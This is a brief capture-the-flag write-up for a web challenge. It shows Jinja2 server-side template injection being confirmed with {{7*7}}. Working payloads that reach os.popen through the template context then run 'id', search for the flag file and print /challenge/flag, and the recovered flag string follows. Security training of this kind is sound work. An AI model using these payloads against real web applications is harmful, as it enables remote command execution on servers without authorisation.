# Description 
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

# Solution : 
- Nothing given as source , try `{{7*7}}` to confirm Jinja2
- we somehow have to get the flag.txt ( most prolly ) 
- {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }} 

se pta chala we have root access now the payload was : 
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('find / -name *flag* 2>/dev/null').read() }}

 
gave us /challenge/flag  
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /challenge/flag').read() }}


 nZ^&@q5&sjJHev0

